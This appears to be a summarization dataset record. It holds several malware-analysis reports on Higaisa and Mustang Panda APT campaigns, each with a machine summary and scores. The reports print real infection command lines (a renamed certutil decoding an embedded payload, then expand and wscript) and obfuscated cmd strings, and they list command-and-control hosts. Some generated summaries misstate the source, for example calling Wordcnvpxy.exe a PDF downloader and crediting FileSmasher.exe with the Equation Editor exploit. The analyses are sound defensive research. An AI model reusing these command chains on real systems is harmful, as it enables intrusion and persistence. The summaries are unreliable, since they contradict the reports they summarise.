retrieved and then decoded using CertUtil.exe (msioa.exe).Stage 2. ArchiveThe decoding results in a CAB archive, which is unpacked into the same %tmp% folder and contains the following files:3UDBUTNY7YstRc.tmp (DLL, used for autorun)9sOXN6Ltf0afe7.js (installation script)486AULMsOPmf6W.tmp (a legitimate executable file used for autorun)20200308-sitrep-48-covid-19.pdf (the original WHO report, used as bait)cSi1r0uywDNvDu.tmp (XSL, contains part of the installation code written in VBScript)MiZl5xsDRylf0W.tmp (installer payload)After the files have been retrieved, the malware moves to the next stage in the process of achieving persistence in the system, launching the file 9sOXN6Ltf0afe7.js.Stage 3. JS script. Part one.The script is written as one line:Figure 4. A fragment of the code from 9sOXN6Ltf0afe7.jsIn effect, the script executes the following console commands:Figure 5. Console commands in 9sOXN6Ltf0afe7.jsA folder with the name cscript.exe is created in the temporary folder called %tmp%. The original script interpreter, cscript.exe, is then copied into this folder with the name msproof.exe. An XSL file by the name of WsmPty.xsl is copied in as well. This is what the XSL file looks like:Figure 6. A fragment of the code in WsmPty.xslA legitimate script, %windir%\System32\winrm.vbs (a console tool for work with the Windows Remote Management API), is launched using the interpreter. It is then passed the command get wmicimv2/Win32_Process?Handle=4 and the output format: format:pretty.When this format is specified, winrm.vbs is pulled from the directory where the interpreter cscript.exe and the file WsmPty.xsl are located. winrm.vbs is used to format the command output (regardless of whether it was successfully executed). This will then run the VBScript code embedded in the file.This method, described by Matt Graeber in 2018, bypasses application whitelisting restrictions to run unauthorized code. There is one essential condition for winrm.vbs to work--the string cscript.exe must be present in the path to the interpreter. This is why the folder that it is copied into is created with this particular name.Stage 4. XSLThe VBScript code that is launched contains a hex string and code that are responsible for decoding and executing the file. Here you can see the code with all hex strings converted into bytes and deobfuscated variable names:Figure 7. Deobfuscated VBScript codeEssentially, what the code does is create a file called OFFICE12 in the user profile, as well as a shortcut called Accessories.lnk in the startup directory. The shortcut does not directly launch the payload, instead using the function FileProtocolHandler from the url.dll library:C:\Windows\System32\rundll32.exe C:\Windows\system32\url.dll,FileProtocolHandler %UserProfile%\OFFICE12\MSOStyle.exeAdditionally, a file called 2m7EBxdH3wHwBO.tmp is created in %tmp% via the function Write4D5A90. This file contains three bytes from the beginning of an EXE file: 0x4D, 0x5A, 0x90.Stage 3. JS script. ContinuationOnce the VBScript in XSL has been run, console commands launched by the JS code continue to be executed. Three files are copied into the folder OFFICE12 that was created in the user profile. Those files are:MSOSTYLE.EXEOINFO12.OCXWordcnvpxy.exeThe last file, which is the payload, is built from the three-byte introductory string created by VBScript and from MiZl5xsDRylf0W.tmp, which was unpacked earlier. The result is a valid .exe file.MSOSTYLE.EXE is a legitimate file from the Microsoft Office 2007 package. It is responsible for sideloading the dynamic link library OINFO12.OCX.OINFO12.OCX contains the code for executing the final payload:Figure 8. Launching Wordcnvpxy.exe in DllMainIt also contains code in exported functions that is not actually run (we suspect that this is part of an attempt to avoid detection in sandbox environments):Figure 9. The code of GetOfficeData()Figure 10. The code of DeleteOfficeData()The last step in the script is to open the PDF file that was used as bait.Wordcnvpxy.exe downloaderThe payload is an application that creates a hidden window (the name of the class and the window is SK_Parasite).Figure 11. Window creation and event processing loop in Wordcnvpxy.exeEssential functions are loaded dynamically. Base64 with the following non-standard alphabet is used to decode library names: z2bqw7k90rJYALIQUxZK%sO=hd5C4piVMFlaRucWy31GTNH-mED8fnXtPvSojeB6g. Instead of using function names, their hashes are used, using SuperFastHash algorithm.Figure 12. Dynamically loaded librariesThe main code is run in a separate thread: every 10 minutes, the application contacts the C&C server motivation[.]neighboring[.]site and passes it the computer's identifier in the User-Agent string. The identifier is a SuperFastHash of the system volume serial number and the name of the computer.Figure 13. Main downloader cycleThe response from the server is saved into a temporary file. If the response contains at least 10 bytes, it is decoded from Base64 and divided into two segments separated by the symbol $. The first segment contains the RC4-encoded executable file, and the second contains its filename without an extension.Figure 14. Processing the server responseThe method used to construct a key for decoding the RC4 encryption is interesting. It is generated via a recurrent sequence that begins with two numbers (28 and 39), and every subsequent number equals the sum of the previous two, mod 255. The key consists of 64 bytes and begins with the first sum in the sequence. The key is later expanded to 256 bytes (by looping) and is used in the standard RC4 algorithm.Figure 15. Generation of the RC4 key in Wordcnvpxy.exeThe executable file received from the server is saved in %TEMP% with the specified name and is then launched.Object 2: ???.doc (Invitation card.doc)This is an RTF file containing a congratulatory statement:Figure 16. Document with holiday greetingsThe document was created using the popular builder 'Royal Road RTF' (also known as 8.t), which exploits the CVE-2018-0798 vulnerability in Microsoft Equation Editor. This builder is not publicly accessible, but is widely used by Chinese APT groups, including TA428, Goblin Panda, IceFog, and SongXY. The name '8.t' originates from the fact that the malware creates a file called 8.t containing the encoded payload in a temporary folder.Exploitation results in the creation of a file called %APPDATA%\microsoft\word\startup\intel.wll. This file is a DLL dropper, which is loaded the next time Microsoft Word is launched. Its payload consists of two files: %ALLUSERSPROFILE%\TotalSecurity\360ShellPro.exe and %ALLUSERSPROFILE \TotalSecurity\utils\FileSmasher.exe. The files are encoded using xor 0x1A.Figure 17. The main function in the intel.wll dropper (fragment)The dropper achieves persistence in the system by creating a shortcut in the startup directory that launches %ALLUSERSPROFILE%\TotalSecurity\360ShellPro.exe with key /func=5. This file is a modified component of the antivirus tool 360 Total Security, and is used to transfer control to the downloader FileSmasher.exe via a method similar to DLL side-loading.The legitimate 360ShellPro.exe file contains a number of relative paths to the executable file. The correct file is selected and launched depending on the value of the argument /func=.Figure 18. File selection based on the func parameterFileSmasher.exe downloaderIn many ways, FileSmasher.exe resembles Wordcnvpxy.exe. It is also a windowed application (class name: NIS_K). However, in this case, the relevant code is launched using a 10-minute timer, not a separate thread.Figure 19. Window creation, timer set-up, and event processing loop in FileSmasher.exeDynamic DLL loading is not used (all imports are static) and the address of the C&C server is restored using a similar RC4 decoding function (instead of decoding from Base64 with a nonstandard alphabet). However, the initial elements in the series used to generate the key have different values (8 and 5), and the generative algorithm is fully repeated.Figure 20. RC4 key generation in FileSmasher.exeThe CRC32 from the system volume serial number is used as an infected machine identifier. It is passed explicitly as a GET parameter. The following is the full address that the downloader uses to access the server: http://walker[.]shopbopstar[.]top/blog/index.php?ei={32 random chars}&ti={volume serial CRC32}Figure 21. Construction of a URL to access the monitoring server, from FileSmasher.exeThe loading algorithm is practically identical:The server response is saved in a temporary file and is processed only if it contains at least 10 bytes.In contrast to Wordcnvpxy.exe, there is no Base64 decoding.The response is divided into two parts using an ampersand (&) instead of a dollar sign ($).The first segment is also an executable file encrypted with RC4, and the second part is its name without an extension.The file is decoded using the same function that is responsible for decoding the address (the RC4 key parameters are 8 and 5).The loaded file is launched using CreateProcess.It is worth noting that the resource files for Wordcnvpxy.exe and FileSmasher.exe include a dialogue window, ""About,"" containing the application's name and copyright information.Figure 22. The ""About"" dialogue window from the resources included in FileSmasher.exeThis window as well as other resources (Menu, Accelerators) are generated by Visual Studio when the project is created. In the case of Wordcnvpxy.exe, the application name indicated in the dialogue window matches the name of the window's class (SK_Parasite). However, this is not the case for FileSmasher.exe. Here, the application is called AttackBot, and in its case we see the abbreviation NIS, which we saw earlier in the name of the window class (NIS_K).Experts at Tencent drew a connection between Higaisa and the Republic of Korea and identified its main targets as North Korean government and trade organizations. This suggests that NIS could stand for National Intelligence Service (The National Intelligence Service of the Republic of Korea). SK_Parasite could be a reference to the South Korean film Parasite (released in 2019). Alone, these data are insufficient to draw firm conclusions, however, they can be seen as circumstantial evidence for a connection with South Korea.Related objectsThe contents of the initial document (New Year greetings) and the date the file was created (22.12.2019) specify the period during which it was used. However, it is not the only object of its kind. Analysts at Tencent identified another distribution of malicious files during the same period. In that case the filenames were Happy-new-year-2020.scr and 2020-New-Year-Wishes-For-You.scr. These files are executable and use a congratulatory JPG file as bait. The image is dropped from an executable file and opened in the default viewer.Figure 23. The image contained in Happy-new-year-2020.scrFigure 24. The image contained in 2020-New-Year-Wishes-For-You.scrOther than the exploitation of the CVE-2018-0798 vulnerability, the structure of these threats is effectively identical to the RTF document. SCR files are droppers whose payload is decrypted using xor 0x1A and unpacked into the subdirectory of %ALLUSERSPROFILE%.Figure 25. The main function in 2020-New-Year-Wishes-For-You.scr dropper (fragment)The payload consists of a legitimate executable file (rekeywiz.exe from Windows 7 is used) and the DLL downloader Duser.dll. The legitimate file is added to startup using a shortcut.The downloader decrypts the URL using RC4 (the initial values are 8, 5 and 9, 5) and adds a random string and the CRC32 computer identifier into the GET parameter.Figure 26. Construction of a URL to access the control server, from Duser.dll (2020-New-Year-Wishes-For-You.scr dropper)The downloader instance unpacked from 2020-New-Year-Wishes-For-You.scr to establish a connection with the C&C server uses a statically linked libcurl library. The other instance uses statically imported functions from the winhttp.dll library, just like FileSmasher.exe.The server is accessed at the following addresses: http://adobeinfo[.]shopbopstar[.]top/notice/index.php and http://petuity[.]shopbopstar[.]top/research/index.php.In both cases data is received from the server in the same format as in FileSmasher.exe.Regardless of the fact that neither of the droppers that we have described actually create any windows, they do contain a standard set of window resources, including the ""About"" dialogue window. The strings ""K_NIS"" and ""KISA"" are used as application names.C&C server responsesTwo types of components were used as the payloads distributed by the C&C server:The system information collector (InfoStealer), which essentially provides the function of running the console command systeminfo & ipconfig -all & tasklist & net view & dir c:\ & dir c:\users\ & dir d:\ & dir e:\ and relays the response to the command server.Gh0st RAT in a variety of modified forms, particularly with all essential functionality implemented in DLL plug-ins loaded from the C&C server.These instances of Gh0st RAT are interesting when compared with the publicly accessible source code, as they implement a non-standard encryption of incoming and outgoing data. In packets containing less than 10 payload bytes (not including the header), the first 10 bytes are processed with a 0x12 xor key. The bytes 0x0 and 0x12 are left unchanged. Data are compressed with LZO instead of zlib.Figure 27. Decompiled code of the function CClientSocket::OnReadIn addition, the m_bPacketFlag field (the signature of packets sent to the command sever) is initialized with a pseudorandom value calculated using the value returned from calling GetTickCount(). In the original code, the field is equal to Gh0st.Figure 28. Initialization of the field CClientSocket::m_bPacketFlagConclusionThe results of our study demonstrate how the malicious objects used by the Higaisa group have evolved over time. Beginning with a simple distribution of executable files, they shifted towards utilizing exploits and complex multi-stage threats. However, the structure of their tools (such as droppers and downloaders) remained largely unchanged. To deter detection, the attackers modified details such as the control server URL, RC4 key parameters, the legitimate files used for DLL side-loading, and the libraries used for HTTP interaction.Author: Alexey Zakharov, Positive TechnologiesIOCsFilename MD5 SHA-1 SHA-256 20200308-sitrep-48-covid-19.pdf.lnk 21a51a834372ab11fba72fb865d6830e 9ceb6e0e4ad0a2c03751d0563a82a79ebb94ec95 95489af84596a21b6fcca078ed10746a32e974a84d0daed28cc56e77c38cc5a8 oGhPGUDC03tURV.tmp 37f78b1ad43959a788162f560bdc9c79 992d530d4bb35fb8dbdfb690740ead6e0fa974ec f74199f59533fbbe57f0b2aae45c837b3ed5e4f5184e74c02e06c12c6535f0f9 OINFO12.OCX 83d04f21515c7e6316f9cd0bb393a118 e00b982a14835dae781bbbe06055d7d18acc6eb0 a49133ed68bebb66412d3eb5d2b84ee71c393627906f574a29247d8699f1f38e 9sOXN6Ltf0afe7.js 4f8ff5e70647dbc5d91326346c393729 2fd4eb78e53af6a5b210943ca8f0e521bb567afb 70b8397f87e4a0d235d41b00a980a8be9743691318d30293f7aa6044284ffc9c MSOSTYLE.EXE 371e896d818784934bd1456296b99cbe 88f23b0913ef5f94cd888605504e1e54c3a6e48f 604679789c46a01aa320eb1390da98b92721b7144e57ef63853c3c8f6d7ea85d 20200308-sitrep-48-covid-19.pdf faf5ef01f4a9bf2aba7ede67dcc5a2d4 4e0c1a05360c6bebf903a708acf6792b13f43870 2dd886cc041ea6e5e80880ccbbc54be42079598acf0c1e7e459616c3f9c0dd34 cSi1r0uywDNvDu.tmp eefeb76d26338e09958aae5d81479178 c400e10a8f2b5b62f919033e2db0a1f99b1a3c38 9d52d8f10673518cb9f19153ddbe362acc7ca885974a217a52d1ee8257f22cfc MiZl5xsDRylf0W.tmp c1d8966fa1bd7aee41b2c4ad731407d3 6e7e3277801669f3053bf364ae6be89f00017c89 b578a237587054f351f71bd41bede49197f77a1409176f839ebde105f3aee44c Wordcnvpxy.exe fd648c3b7495abbe86b850587e2e5431 d0e0d641f3a063fb02c7f862ea8586312af5fa2e 002c9e0578a8b76f626e59b755a8aac18b5d048f1cc76e2c12f68bc3dd18b124Filename MD5 SHA-1 SHA-256 ???.doc 2123bf482c9c80cb1896ff9288ad7d60 ea02db9b92cbf1d243b502d130aa2dd6c98637d2 500b6037ddb5efff0dd91f75b22ccce5b04d996c459d83d1f07fae8780b24e09 intel.wll 59a55c7bbc0ee488ec9e2cf50b792a56 a29ce0331015f2a3e87fd7fe1ce9dae228808b59 1b978324df504451c2a3430e32dc577742e2ac93b2602d68d771d89be4199a58 360ShellPro.exe d5e42cc18906f09d5bab62df45b5fcf6 46833928f75db90220451e026997d039730906fa 1acd3cbc83dd4153f07b869b3142594aa9e77df33aa5319312439ecf7f606152 FileSmasher.exe ea628fef3b547a1476d915963415e64c 07dbfaa430a201ce81f5079dd1e48379fac27177 f2c60274e625bcb051909797b35095dc5f37fae155cfdd96287c4ac112664a65motivation[.]neighboring[.]sitewalker[.]shopbopstar[.]top";The XSL file contains part of the installation code written in VBScript. Wordcnvpxy.exe is a downloader for PDF files. It creates a hidden window and uses Base64 to decode library names. The ITSecurity report indicates that a vulnerability in Microsoft Equation Editor has been exploited by Chinese APT groups, including TA428, Goblin Panda, IceFog, and SongXY. The exploitation results in the creation of a file called %APPDATA%\microsoft\word\startup\intel.wll. This file is a DLL dropper, which is loaded the next time Microsoft Word is launched. Its payload consists of two files: %ALLUSERSPROFILE%\TotalSecurity\360ShellPro.exe and %ALLUSERSPROFILE \TotalSecurity\utils\FileSmasher.exe. The dropper achieves persistence in the system by creating a shortcut in the startup directory that launches %ALLUSERSPROFILE%\TotalSecurity\360ShellPro.exe with key /func=5. This file is a modified component of the antivirus tool 360 Total Security, and is used to transfer control to the downloader FileSmasher.exe via a method similar to DLL sideloading. The legitimate 360ShellPro.exe file contains a number of relative paths to the executable file. The correct file is selected and launched depending on the value of the argument /func=. FileSmasher.exe is a malicious Windows executable file that uses the CVE20180798 vulnerability to exploit vulnerable systems. It is a dropper whose payload is decrypted using xor 0x1A and unpacked into the subdirectory of %ALLUSERSPROFILE%.;en;{'r': 0.1182170542635659, 'p': 0.9384615384615385, 'f': 0.20998278630884495};{'r': 0.07070240295748614, 'p': 0.7766497461928934, 'f': 0.12960609758100408};{'r': 0.11724806201550388, 'p': 0.9307692307692308, 'f': 0.20826161591297576}
https://www.malwarebytes.com/blog/news/2020/06/higaisa;New LNK attack tied to Higaisa APT discovered;"Posted: June 4, 2020 byWe describe a new spearphishing campaign tied to the potential North Korean Higaisa APT group.This post was authored by Hossein Jazi and Jerome SeguraOn May 29th, we identified an attack that we believe is part of a new campaign from an Advanced Persistent Threat actor known as Higaisa. The Higaisa APT is believed to be tied to the Korean peninsula, and was first disclosed by Tencent Security Threat Intelligence Center in early 2019.The group's activities go back to at least 2016 and include the use of Trojans such as Gh0st and PlugX, as well as mobile malware. Its targets include government officials and human rights organizations, as well as other entities related to North Korea.In this latest incident, Higaisa used a malicious shortcut file ultimately responsible for creating a multi-stage attack that consists of several malicious scripts, payloads and decoy PDF documents.DistributionThe threat actors used a malicious LNK file bundled within an archive file which was most likely distributed via spear-phishing.We were able to identify two variants of this campaign that possibly have been distributed between May 12th and 31st:""CV_Colliers.rar""""Project link and New copyright policy.rar""Both RAR archives bundle two malicious LNK files. In the newer variant (CV_Colliers.rar), the LNK files are disguised as a Curriculum Vitae (CV) and International English Language Testing System (IELTS) exam results. The older one (Project link and New copyright policy.rar) seems to target product teams that are using zeplin.io.The following shows the overall process flow when executing the malicious LNK file.Figure 1: Process graphLNK fileThe LNK file contains a list of commands that will be executed upon running, and a blob that is a base64 encoded compressed payload. Here is the list of commands that will be executed:Figure 2: Malicious lnk commandsCopy content of the LNK file into ""g4ZokyumB2DC4.tmp"" in %APPDATA% temp directory.Copy content of ""certutil.exe"" into ""gosia.exe"" ( ""*ertu*.exe is used to bypass security detection).Look for the base64 blob using ""findstr.exe"" and write it to ""cSi1rouy4.tmp"".Decode content of ""cSi1rouy4.tmp"" using ""gosia.exe -decode"" (certutil.exe -decode) and write it to ""o423DFDS4.tmp"".Decompress content of ""o423DFDS4.tmp"" in temp directory along with a decoy PDF document using ""expand.exe -F:*"" (Figure 3) .Copy ""66DF3DFG.tmp"" and ""34fDKfSD38.js"" files into ""C:\Users\Public\Downloads"" directory.Execute the JS file by calling Wscript.Open the decoy document.Figure 3: Content of the ""o423DFDS4.tmp"" cab fileThe list of commands executed by this LNK shortcut is the same as the one reported by Anomali on the Higasia Covid-19 campaign. The only difference is the name of the tmp files and name of certutil.exe which in this new case is ""gosia.exe"", while in the March campaign the name was ""mosia.exe"".Both LNK files embedded within the archive are executing similar commands with the different Command and Control (C&C) configurations. Running each of them would show a different decoy document.Figure 4: CV Decoy documentFigure 5: IELTS test result decoy documentJS fileThe JavaScript file performs the following commands:Create ""d3reEW.exe"" in ""C:\Users\Public\Downloads"" and store ""cmd /c ipconfig"" in it.Execute the dropped ""svchast.exe"".Copy ""svchhast.exe"" into startup directory and rename it as ""officeupdate.exe"".Add ""officeupdate.exe"" to scheduled tasks.Send a POST request to a hardcoded URL with ""d3reEW.exe"" as data.Figure 6: JS contentFigure7: POST requestsvchast.exeSvchast.exe is a small loader that loads the content of the shellcode stored in ""66DF3DFG.tmp"".Figure 8: Main function of svchast.exeIn fact, this shellcode is a wrapper around the final shellcode. It performs some checks and then calls the final shellcode.Figure 9: Calling final shellcodeThe final shellcode dynamically resolves the imports and allocates memory for the content that will be executed.Figure 10: Resolving the importsFigure 11: Allocate memory for new threadFinally it calls ""CreateThread"" to create a thread within its memory space to make HTTPS requests to its C&C server.Figure 11: CreateThreadAt the time of analysis, the server was down so we weren't able to clearly identify the ultimate goal of this attack.Chaining techniques for evasionWhile most malware campaigns use a simple decoy document that typically retrieves a malware payload, more advanced attackers will often try unconventional means to infect their victims.We reproduced this attack in our lab using an email as the infection vector, as we surmise that victims were spear-phished. Malwarebytes (in this case the Nebula business version) stopped the LNK file execution from WinRAR and therefore completely stopped the attack.IOCsCV_Colliers.rardf999d24bde96decdbb65287ca0986db98f73b4ed477e18c3ef100064bceba6dProject link and New copyright policy.rarc3a45aaf6ba9f2a53d26a96406b6c34a56f364abe1dd54d55461b9cc5b9d9a04Curriculum Vitae_WANG LEI_Hong Kong Polytechnic University.pdf.lnk50d081e526beeb61dc6180f809d6230e7cc56d9a2562dd0f7e01f7c6e73388d9Tokbox icon - Odds and Ends - iOS - Zeplin.lnk1074654a3f3df73f6e0fd0ad81597c662b75c273c92dc75c5a6bea81f093ef81International English Language Testing System certificate.pdf.lnkc613487a5fc65b3b4ca855980e33dd327b3f37a61ce0809518ba98b454ebf68bCurriculum Vitae_WANG LEI_Hong Kong Polytechnic University.pdf.lnkdcd2531aa89a99f009a740eab43d2aa2b8c1ed7c8d7e755405039f3a235e23a6Conversations - iOS - Swipe Icons - Zeplin.lnkc0a0266f6df7f1235aeb4aad554e505320560967248c9c5cce7409fc77b56bd5C2 domains (ipconfig exfiltration)sixindent[.]epizy[.]comgoodhk[.]azurewebsites[.]netzeplin[.]atwebpages[.]comC2s used by svchast.exe45.76.6[.]149www.comcleanner[.]infoMITRE ATT&CK techniques";"The ITSecurity report describes a new spearphishing campaign tied to the potential North Korean Higaisa APT group. The group's activities go back to at least 2016 and include the use of Trojans such as Gh0st and PlugX, as well as mobile malware. Its targets include government officials and human rights organizations, as well as other entities related to North Korea. In this latest incident, Higaisa used a malicious shortcut file ultimately responsible for creating a multistage attack that consists of several malicious scripts, payloads and decoy PDF documents. Distribution The threat actors used a malicious LNK file bundled within an archive file which was most likely distributed via spearphishing. We were able to identify two variants of this campaign that possibly have been distributed between May 12th and 31st: ""CV_Colliers.rar"" ""Project link and New copyright policy.rar"" Both RAR archives bundle two malicious LNK files. In the newer variant (CV_Colliers.rar), the LNK files are disguised as a Curriculum Vitae (CV) and International English Language Testing System (IELTS) exam results. The older one (Project link and New copyright policy.rar) seems to target product teams that are using zeplin.io. The following shows the overall process flow when executing the malicious LNK file: Figure 1: Process graph LNK file The LNK file contains a list of commands that will be executed upon running, and a blob that is a base64 encoded compressed payload. Here is the list of commands that will be executed: Figure 2: Malicious lnk commands Copy content of the LNK file into ""g4ZokyumB2DC4.tmp"" in %APPDATA";en;{'r': 0.36674259681093396, 'p': 0.9252873563218391, 'f': 0.5252854771742215};{'r': 0.28125, 'p': 0.8661087866108786, 'f': 0.42461538091457723};{'r': 0.36674259681093396, 'p': 0.9252873563218391, 'f': 0.5252854771742215}
https://www.anomali.com/blog/covid-19-themes-are-being-utilized-by-threat-actors-of-varying-sophistication;COVID-19 Themes Are Being Utilized by Threat Actors of Varying Sophistication;"Authored by: Gage Mele, Parthiban R., and Tara GouldThe Tactics, Techniques and Procedures (TTPs) Are Known but the Content Is Coronavirus-ThemedOverviewThreat actors are utilizing the global spread of COVID-19 (Coronavirus) to conduct malicious activity. As the world responds to this threat in various ways, actors are attempting to use the chaos to their advantage. COVID-19 is being weaponized for scare tactics by threat actors for conducting malicious activity utilizing different Tactics, Techniques, and Procedures (TTPs). While the majority of observations made by Anomali Threat Research (ATR) are commodity (purchasable and widely distributed) campaigns and malware. ATR identified that the Higaisa and Mustang Panda Advanced Persistent Threat (APT) groups have been utilizing Coronavirus-themed lures in their campaigns.In addition to machine-targeted campaigns, ATR also identified COVID-19-themes targeting Android mobile devices. One of the samples is utilizing a fully functional Coronavirus infection-tracking application while the SpyNote Remote Access Trojan (RAT) runs in the background. Another is a phishing campaign that uses a fake Adobe Flash update and COVID-19 related URLs to install the Cerberus banking trojan. While some of these malware are commodity and may be more obvious malicious attempts, actors will likely continue to abuse these themes to install various malware families, some of which will be discussed below.DetailsThe current activity being reported on open sources consists of threat actors using COVID-19 as part of phishing campaigns, both in email subject and content as well as attachments.[1] These kind of virus-themed campaigns began almost immediately after the 41 cases of COVID-19 were reported on by the World Health Organization on December 31, 2019.[2] By January and February 2020, Coronavirus-themed lures were widespread with assistance from the Emotet botnet.[3] The malware used in these campaigns can vary because many distribution methods are offered for purchase and utilized by numerous actors, however, there have been some instances of Advanced Persistent Threat (APT) actors attempting to capitalize on the COVID-19 outbreak.In mid-March 2020, Check Point Research published their findings regarding a campaign targeting the Mongolian public sector utilizing Coronavirus-themed lure documents.[4] This RTF activity also coincides with RTF activity identified by ATR.[5] APTs frequently use relevant themes as lures, and ATR has also identified such groups attempting to capitalize on Coronavirus-related events.APT ActivityATR observed a campaign beginning in late February through mid-March 2020, that we believe is being conducted by the China-based APT group, Mustang Panda. The group is utilizing decoy documents related to COVID-19 to target Taiwan and Vietnam. Mustang Panda is continuing to use Cobalt Strike and PlugX RAT as their final payloads. This activity aligns with Mustang Panda TTPs previously identified by ATR.[6]Lure DocumentsDocument title - 02-21-1.docxHash - 6d994c64c17ce50cbb333c8b4bcbd8e0Figure 1 - Chen Chien-jen Facebook DiscussionThe document file above is describing a post on Facebook written by Chen Chien-jen, current Vice President of the Republic of China and former Vice President of Taiwanese research institution, Academia Sinica. The post discusses community transition [of Coronavirus] and the United States' (US) Centers for Disease Control (CDC) listing of countries for it, specifically Taiwan. Taiwan's Foreign Ministry subsequently demanded removal from said listing.Document title - 03-01-1.docxHash - 7f0a1bdde14ea1f3085b43bdadcfb146Figure 2 - COVID-19 QuestionsFigure 2 contains text that was translated to English, likely from Chinese due to Mustang Panda being China-based, because of the spelling and grammar errors that would be uncommon for a native speaker. The text poses questions about neutralizing COVID-19 with varying levels of sophistication.Document title - Chi Thi cua thu tuong nguyen xuan phuc.docHash - 13d61974d2db537bdb0504cfc53b74a7Figure 3 - Vietnamese Government Meeting Article from March 3, 2020The document in Figure 3 is an article discussing a meeting held by Vietnamese Prime Minister Nguyen Xuan Phuc that was held on March 3, 2020. Other government officials attending the meeting spoke of unity in these times and how approximately 3,000 have been placed in isolation and are under the care of the army. Other topics include overall Coronavirus prevention measures and updates on travel restrictions. The article is publicly available at www.cantho.gov[.]vn, and was likely taken by Mustang Panda from this source as observed by ATR in previous campaigns conducted by the group.Technical AnalysisThe above mentioned three RAR (compressed files) files each contain a Windows Shortcut (.lnk) file. The .lnk files being utilized by Mustang Panda typically contain an embedded HTA file with VBscript, once executed, will drop and open the decoy document while the malicious activity of the payload runs in the background. ATR observed PlugX and Cobalt Strike being delivered as the primary payloads throughout the campaign..lnk filesTable 1 - .lnk file metadataFileMD5 LinkModifiedDate FileSize NameString CommandLineArgs NetBios Name MAC Address FC00964131A8C9407BA77484E724FC9D 7/14/2009 1:14 301568 02-21-1.lnk /c f%windir:~-3,1%%PUBLIC:~-9,1% %x in (%temp%=%cd%) do f%windir:~-3,1%%PUBLIC:~-9,1% /f delims=="" %i in ('dir ""%x-21-1.lnk"" /s /b') do start %TEMP:~-2 win-67od36i8f4c 00:0C:29:50:2D:E6 0F794D6C6646A260558E9D638AE060C9 7/14/2009 1:14 301568 03-01-1.lnk /c f%windir:~-3,1%%PUBLIC:~-9,1% %x in (%temp%=%cd%) do f%windir:~-3,1%%PUBLIC:~-9,1% /f delims=="" %i in ('dir ""%x-01-1.lnk"" /s /b') do start %TEMP:~-2 cia-at28--planc 00:0C:29:50:2D:E6 A4B7FE08900074B6A103D2CF36730421 11/21/2010 3:24 302592 Chi Thi cua thu tuong nguyen xuan phuc.lnk /c f%windir:~-3,1%%PUBLIC:~-9,1% %x in (%temp%=%cd%) do f%windir:~-3,1%%PUBLIC:~-9,1% /f delims=="" %i in ('dir ""%xChi Thi cua thu tuong nguyen xuan phuc.lnk"" /s /b') do start %TEMP:~-2 win-gnhs1vcenrt AA:50:18:7E:EB:82Payload AnalysisMustang Panda has used the well known adversary emulation tool called Cobalt Strike as the final payload for the following samples 02-21-1.lnk and 03-01-1.lnk. The group has utilized the malleable Command and Control (C2) feature in Cobalt Strike tool to mask the malicious traffic behind a legitimate DNS request to code.jquery.com. The samples mentioned above use 123.51.185[.]75 as their final C2.Two notable changes from Mustang Panda previous campaigns identified by ATR are:Change in directory C:UsersPublicMusic where the payload is droppedwhere the payload is dropped Usage of the legitimate executable tencentsoso.exe that is used for DLL side loadingThe sample Chi Thi cua thu tuong nguyen xuan phuc.lnk uses PlugX as its final payload. Once executed it drops three files in the directory C:ProgramDataMicrosoft Malware Protectionydy. The unescapp.exe is a legitimate executable that is signed by ""ESET, spol. s r.o."" and it is being abused for DLL hijacking technique to execute http_dll.dll which decodes and loads the malicious payload http_dll.dat. Upon execution of the payload it reaches out to the C2 domain vietnam[.]zing[.]photos and it resolves to 104.160.44[.]85.Figure 4 - Dropped File LocationATR attributes this activity to Mustang Panda based on the TTPs, targeted countries, and usage of malware families that all have been previously attributed to the group.[7]Higaisa ActivityCovid.pdf.lnk - 21a51a834372ab11fba72fb865d6830eOn March 15, 2020, ATR identified a malicious .lnk file that utilizes an infection chain similar to other known APT groups. This campaign was found to use C2 infrastructure that overlaps with the Korea-based APT group, Higaisia. The lure document, dropped by the .lnk file, was downloaded from the World Health Organization website, and is likely being used to target English-speaking individuals and entities.The .lnk uses a multi stage process to deliver a decory PDF document (Figure 5) and the final payload PlugX and it reaches out to C2 motivation[.]neighboring[.]site and it resolves to 69.172.75[.]223. PlugX is a Remote Access Trojan (RAT) that is commonly used by China-based threat actors.Figure 5 - World Health Organization Situation ReportTechnical AnalysisThe .lnk file contains an embedded blob of base64 encoded content. Inspecting the .lnk metadata, it appears that the actor has modified them, for example the following fields have been tampered, creation time, Machine ID and MAC address as shown in Figure 6.Figure 6 - .lnk MetadataUpon execution of the .lnk file, the following commands were run in the background,/c copy ""20200308-sitrep-48-covid-19.pdf.lnk"" %tmp%\g4ZokyumBB2gDn.tmp /y& for /r C:\Windows\System32\ %i in (*ertu*.exe) do copy %i %tmp%\msoia.exe /y& findstr.exe ""TVNDRgAAAA"" %tmp%\g4ZokyumBB2gDn.tmp>%tmp%\cSi1r0uywDNvDu.tmp&%tmp%\ msoia.exe -decode %tmp%\cSi1r0uywDNvDu.tmp %tmp%\oGhPGUDC03tURV.tmp& expand %tmp%\oGhPGUDC03tURV.tmp -F:* %tmp% & wscript %tmp%\9sOXN6Ltf0afe7.jsThe file cSi1r0uywDNvDu.tmp is a Windows cabinet (.cab) file. The contents of the cabinet file is shown in Figure 7 below.Figure 7 - Contents of Cabinet FileThe contents of the cabinet file are extracted using built in windows executable file extract.exe and they are renamed as shown in Figure 8.Figure 8 - Renamed Cabinet File ContentsThe JavaScript, 9sOXN6Ltf0afe7.js, performs multiple operations like copying and renaming files, and it uses the living off the land technique to execute the VBscript file WsmPty.xsl using cscript.exe.[8] The VBscript is responsible for creating persistence and it executes the further payloads by abusing the legitimate executable msostyle.exe. Upon its execution it loads the file oinfo12.ocx (.dll) and it further loads and executes wordcnvpxy.exe (PlugX). The malware reaches out to the C2 URL motivation[.]neighboring[.]site/01/index.php.Figure 9 and 10 below depicts the overlapping evidence, as mentioned above. The C2 IP, 69.172.75[.]223, was previously used by Higaisa and reported on in late February, 2020.[9]Figure 9 - Higaisa C2 OverlapFigure 10 - Higaisa Sample Communication to IP (https://community.riskiq.com/search/69.172.75.223)Mobile MalwareAPK title - Avist.apkHash - 107169ae6951a5cba57d2a0cd274e28fadf5c73d73e91a386f15cf4dc35edd38This Android application is fully-functional and will update overall COVID-19 statistics as a normal application would. While the user installs the COVID-19 tracking application, the SpyNote RAT is downloaded in the background.Figure 11 - Installation RequestFigure 12 - Functional COVID-19 Application AppearanceAPK title - UpdateFlashPlayer_11_5_1.apkHash - F57a44bec2f7af2da443f068edb0a743f9625ac3a9d686393bacb8e72274b5deThe Android banking Trojan, Cerberus has been utilizing the attention around the Coronavirus outbreak as an opportunity to push their malware. Using various websites including 